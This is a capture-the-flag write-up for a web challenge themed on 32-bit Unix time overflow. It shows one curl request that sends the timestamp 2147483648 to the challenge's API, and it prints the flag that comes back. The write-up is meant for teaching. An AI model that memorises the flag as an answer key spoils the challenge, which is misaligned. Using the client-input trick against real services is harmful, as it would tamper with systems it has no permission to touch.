# The End of Linux

Type: Web

## Summary

The page only exposed one interactive action: the `Check Time` button. The bundled JavaScript in `/static/script.js` showed that it POSTed JSON to `/api/status`:

```javascript
body: JSON.stringify({ timestamp: Math.trunc(now / 1000) })
```

The theme and description pointed straight at the 32-bit Unix time overflow problem. That means the interesting boundary is `2147483647`, with overflow starting at `2147483648`.

## Solve

Send a timestamp just above the signed 32-bit maximum:

```bash
curl -sS https://endoflinux.sillyctf.psuccso.org/api/status \
  -H 'Content-Type: application/json' \
  -d '{"timestamp":2147483648}'
```

Response:

```json
{"details":"Oh wait... this is a 64-bit server. It only applies to signed 32-bit integers.","flag":"sillyctf{maybe_n0t_the_3nd}","message":"SYSTEM OVERFLOW DETECTED","status":"OVERFLOW"}
```

## Why It Worked

The backend trusted the client-supplied timestamp. Any value greater than the signed 32-bit max (`2147483647`) triggered its overflow branch and returned the flag.

## Flag

```text
sillyctf{maybe_n0t_the_3nd}
```
